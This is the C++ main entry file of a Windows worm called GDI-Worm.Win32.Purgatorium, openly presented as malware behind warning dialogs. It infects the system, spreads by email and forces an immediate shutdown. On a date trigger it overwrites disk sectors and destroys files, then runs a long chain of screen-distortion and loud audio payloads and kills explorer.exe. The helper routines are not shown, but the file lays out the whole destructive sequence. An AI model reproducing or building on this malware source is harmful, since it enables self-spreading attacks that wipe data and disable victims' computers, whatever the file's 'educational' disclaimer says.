typedef struct IUnknown IUnknown;

#include "Purgatorium.h"

INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdline, int nCmdShow)
{
	//If it was infected before, the malware doesn't show the messages box
	if (GetFileAttributesW(L"C:\\Windows\\bootcfg.dat") == INVALID_FILE_ATTRIBUTES)
	{
		if (MessageBoxW(NULL, L"WARNING!!!\n\nYou're about to run a potentially harmful program that can cause your system's death & data loss. This program also displays flashing lights and plays loud sounds.\n\nBy running this program, you accept full responsibility for any damages that may occur. The creator (ArTic a.k.a JhoPro) will not be responsible for anything caused by this software. By the way, this was created for educational and entertainment purposes.\n\nOriginal download: github.com/ArTicZera/GDI-Worm.Win32.Purgatorium\n\nWould you like to proceed with running this program?", L"'Seeking light while fighting our ghosts in the shadows of the purgatory.'", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
		if (MessageBoxW(NULL, L"FINAL WARNING!!!\n\nThis is the final warning, as you're already aware of the risks, press 'Yes' to continue. Otherwise, press 'No'. Also be sure you're running in a safe environment, like virtual machines.\n\nProceed at your own risk...\n\n(Remark: Final payloads starts at the year 2060)", L"GDI-Worm.Win32.Purgatorium - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
		
		if (!System::IsWindowsXP()) system("shutdown -s -t 0");
	}
	
	Payloads::InfectSystem();
	Spread::SpreadEmail();

	HANDLE hTimedMessages = CreateThread(NULL, NULL, &Payloads::TimedMessages, NULL, NULL, NULL);

	//Checks if the year is 2060
	if (System::CheckDate(2) == 160)
	{
		//I suppose you don't want a message box
		//Showing up while you're enjoying this!
		TerminateThread(hTimedMessages, NULL);
		CloseHandle(hTimedMessages);

		Payloads::OverwriteSectors();
		Payloads::DestroyFiles();

		HANDLE hKeybPayload = CreateThread(NULL, NULL, &Payloads::KeyboardPayload, NULL, NULL, NULL);
		HANDLE hMessLabels = CreateThread(NULL, NULL, &Payloads::MessLabels, NULL, NULL, NULL);

		//BYTEBEAT 1
		HANDLE hBB1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64 * 2, 0);
		HANDLE hBytebeat1 = CreateThread(NULL, NULL, &Bytebeats::BytebeatAlpha, hBB1, NULL, NULL);
		Sleep(1000 * 20); //20 Seconds

		/* Refusing Reality */

		//BLUR
		HANDLE hPML1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayload1 = CreateThread(NULL, NULL, &GDIPayloads::InitialBlur, hPML1, NULL, NULL);
		Sleep(1000 * 20); //20 Seconds

		//SHAKE
		HANDLE hPML2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayload2 = CreateThread(NULL, NULL, &GDIPayloads::ScreenShake, hPML2, NULL, NULL);
		Sleep(1000 * 15); //15 Seconds

		//COLORS
		HANDLE hPML3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayload3 = CreateThread(NULL, NULL, &GDIPayloads::RandomColors, hPML3, NULL, NULL);
		Sleep(1000 * 15); //15 Seconds

		//BYTEBEAT 2
		HANDLE hBB2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64 * 2, 0);
		HANDLE hBytebeat2 = CreateThread(NULL, NULL, &Bytebeats::BytebeatBeta, hBB2, NULL, NULL);

		//WAVES
		HANDLE hPML4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayload4 = CreateThread(NULL, NULL, &GDIPayloads::CustomWaves, hPML4, NULL, NULL);
		Sleep(1000 * 15); //15 Seconds

		//TEXTS
		HANDLE hPML5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayload5 = CreateThread(NULL, NULL, &GDIPayloads::RandomTexts, hPML5, NULL, NULL);
		Sleep(1000 * 15); //15 Seconds

		//WARPS
		HANDLE hPML6 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayload6 = CreateThread(NULL, NULL, &GDIPayloads::WarpScreen, hPML6, NULL, NULL);
		Sleep(1000 * 15); //15 Seconds

		//BLURS
		HANDLE hPML7 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayload7 = CreateThread(NULL, NULL, &GDIPayloads::BlurScreen, hPML7, NULL, NULL);
		Sleep(1000 * 15); //15 Seconds

		//PIXELATED COLORS
		HANDLE hPML8 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayload8 = CreateThread(NULL, NULL, &GDIPayloads::BitColors, hPML8, NULL, NULL);
		Sleep(1000 * 15); //15 Seconds

		shakeIntensity = 5;

		HANDLE hBB3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64 * 2, 0);
		HANDLE hBytebeat3 = CreateThread(NULL, NULL, &Bytebeats::BytebeatGamma, hBB3, NULL, NULL);

		//COLOR OVERDOSE
		HANDLE hPML9 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayload9 = CreateThread(NULL, NULL, &GDIPayloads::ColorOverdose, hPML9, NULL, NULL);
		Sleep(1000 * 15); //15 Seconds

		System::EndPayload(hBytebeat1, hBB1);
		System::EndPayload(hBytebeat2, hBB2);
		System::EndPayload(hBytebeat3, hBB3);
		System::EndPayload(hPayload1, hPML1);
		System::EndPayload(hPayload2, hPML2);
		System::EndPayload(hPayload3, hPML3);
		System::EndPayload(hPayload4, hPML4);
		System::EndPayload(hPayload5, hPML5);
		System::EndPayload(hPayload6, hPML6);
		System::EndPayload(hPayload7, hPML7);
		System::EndPayload(hPayload8, hPML8);
		System::EndPayload(hPayload9, hPML9);

		/* Enjoying Last Moments */

		//BYTEBEAT 6

		HANDLE hBBA = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hBytebeatA = CreateThread(NULL, NULL, &Bytebeats::BytebeatA, hBBA, NULL, NULL);

		HANDLE hPMLA = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPMLB = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPMLC = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayloadA = CreateThread(NULL, NULL, &GDIPayloads::Kaleidoscope, hPMLA, NULL, NULL);
		HANDLE hPayloadB = CreateThread(NULL, NULL, &GDIPayloads::BitColors, hPMLB, NULL, NULL);
		HANDLE hPayloadC = CreateThread(NULL, NULL, &GDIPayloads::PaletteCircles, hPMLC, NULL, NULL);
		Sleep(1000 * 20); //20 Seconds

		System::EndPayload(hBytebeatA, hBBA);

		System::EndPayload(hPayloadA, hPMLA);
		System::EndPayload(hPayloadB, hPMLB);
		System::EndPayload(hPayloadC, hPMLC);

		HANDLE hPML10 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPML11 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPML12 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayload10 = CreateThread(NULL, NULL, &GDIPayloads::Tesseract, hPML10, NULL, NULL);
		HANDLE hPayload11 = CreateThread(NULL, NULL, &GDIPayloads::HighFreqWaves, hPML11, NULL, NULL);
		HANDLE hPayload12 = CreateThread(NULL, NULL, &GDIPayloads::CenterCircle, hPML12, NULL, NULL);

		HANDLE hBBB = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hBytebeatB = CreateThread(NULL, NULL, &Bytebeats::BytebeatB, hBBB, NULL, NULL);
		Sleep(1000 * 30); //30 Seconds
		
		System::EndPayload(hPayload11, hPML11);
		System::EndPayload(hPayload12, hPML12);
		System::EndPayload(hBytebeatB, hBBB);

		colorsdelay = 100;

		HANDLE hBBC = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hBytebeatC = CreateThread(NULL, NULL, &Bytebeats::BytebeatC, hBBC, NULL, NULL);
			
		HANDLE hPMLD = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPMLE = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayloadD = CreateThread(NULL, NULL, &GDIPayloads::ScreenStrips, hPMLD, NULL, NULL);
		HANDLE hPayloadE = CreateThread(NULL, NULL, &GDIPayloads::RandomColors, hPMLE, NULL, NULL);
		Sleep(1000 * 20); //20 Seconds

		System::EndPayload(hPayload10, hPML10);
		System::EndPayload(hBytebeatC, hBBC);
		System::EndPayload(hPayloadD, hPMLD);
		System::EndPayload(hPayloadE, hPMLE);

		System::RedrawScreen();

		/* Mind Collapse */

		shakeIntensity = 10;
		warpIntensity = 20;
		colorsdelay = 50;

		//BYTEBEAT 8

		HANDLE hBBX = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hBytebeatX = CreateThread(NULL, NULL, &Bytebeats::Bytebeat2, hBBX, NULL, NULL);

		HANDLE hPML13 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayload13 = CreateThread(NULL, NULL, &GDIPayloads::ScreenShake, hPML13, NULL, NULL);
		Sleep(1000 * 2); //2 Seconds

		HANDLE hPML14 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPML15 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPML16 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayload14 = CreateThread(NULL, NULL, &GDIPayloads::RandomEllipses, hPML14, NULL, NULL);
		HANDLE hPayload15 = CreateThread(NULL, NULL, &GDIPayloads::RandomColors, hPML15, NULL, NULL);
		HANDLE hPayload16 = CreateThread(NULL, NULL, &GDIPayloads::WarpScreen, hPML16, NULL, NULL);
		Sleep(1000 * 10); //10 Seconds

		shakeIntensity = 11;

		HANDLE hPML17 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayload17 = CreateThread(NULL, NULL, &GDIPayloads::BitColors, hPML17, NULL, NULL);
		Sleep(1000 * 10); //10 Seconds

		shakeIntensity = 12;

		HANDLE hPML18 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayload18 = CreateThread(NULL, NULL, &GDIPayloads::XORRoto, hPML18, NULL, NULL);
		Sleep(1000 * 10); //15 Seconds

		HANDLE hBBY = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hBytebeatY = CreateThread(NULL, NULL, &Bytebeats::DecrescendoSiren, hBBY, NULL, NULL);
		Sleep(1000 * 5); //5 Seconds

		shakeIntensity = 13;

		HANDLE hPML19 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPayload19 = CreateThread(NULL, NULL, &GDIPayloads::ABSXORRoto, hPML19, NULL, NULL);
		Sleep(1000 * 20); //20 Seconds

		/* Destiny Accepted */

		shakeIntensity = 15;

		random = false;

		//BYTEBEAT 10

		HANDLE hBBZ = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hBytebeatZ = CreateThread(NULL, NULL, &Bytebeats::ExpSiren, hBBZ, NULL, NULL);

		HANDLE hPML20 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPML21 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPML22 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPML23 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPML24 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPML25 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPML26 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hPML27 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);

		HANDLE hPayload20 = CreateThread(NULL, NULL, &GDIPayloads::ColorOverdose, hPML20, NULL, NULL);
		HANDLE hPayload21 = CreateThread(NULL, NULL, &GDIPayloads::CenterCircle, hPML21, NULL, NULL);
		HANDLE hPayload22 = CreateThread(NULL, NULL, &GDIPayloads::RandomTexts, hPML22, NULL, NULL);
		HANDLE hPayload23 = CreateThread(NULL, NULL, &GDIPayloads::HighFreqWaves, hPML23, NULL, NULL);
		HANDLE hPayload24 = CreateThread(NULL, NULL, &GDIPayloads::HFTNXOR, hPML24, NULL, NULL);
		HANDLE hPayload25 = CreateThread(NULL, NULL, &GDIPayloads::InitialBlur, hPML25, NULL, NULL);
		HANDLE hPayload26 = CreateThread(NULL, NULL, &GDIPayloads::Kaleidoscope, hPML26, NULL, NULL);
		HANDLE hPayload27 = CreateThread(NULL, NULL, &GDIPayloads::PaletteCircles, hPML27, NULL, NULL);
		Sleep(1000 * 40); //40 Seconds

		//r/ProgrammingHorror (SORRY IM LAZY LOL)
		System::EndPayload(hPayload13, hPML13);
		System::EndPayload(hPayload14, hPML14);
		System::EndPayload(hPayload15, hPML15);
		System::EndPayload(hPayload16, hPML16);
		System::EndPayload(hPayload17, hPML17);
		System::EndPayload(hPayload18, hPML18);
		System::EndPayload(hPayload19, hPML19);
		System::EndPayload(hPayload20, hPML20);
		System::EndPayload(hPayload21, hPML21);
		System::EndPayload(hPayload22, hPML22);
		System::EndPayload(hPayload23, hPML23);
		System::EndPayload(hPayload24, hPML24);
		System::EndPayload(hPayload25, hPML25);
		System::EndPayload(hPayload26, hPML26);
		System::EndPayload(hPayload27, hPML27);
		System::EndPayload(hBytebeatZ, hBBZ);
		System::EndPayload(hBytebeatY, hBBY);
		System::EndPayload(hBytebeatX, hBBX);

		/* The End. */

		ShellExecuteW(NULL, L"open", L"taskkill", L"/f /im explorer.exe", NULL, NULL);

		HANDLE hBBFINAL = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hFinalBytebeat = CreateThread(NULL, NULL, &Bytebeats::Noise, hBBFINAL, NULL, NULL);

		HANDLE hEND = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
		HANDLE hFinalPayload = CreateThread(NULL, NULL, &GDIPayloads::GDIPayloadFINAL, hEND, NULL, NULL);
	}
	
	//Enable at the final
	Sleep(INFINITE);
	
	return 0;
}
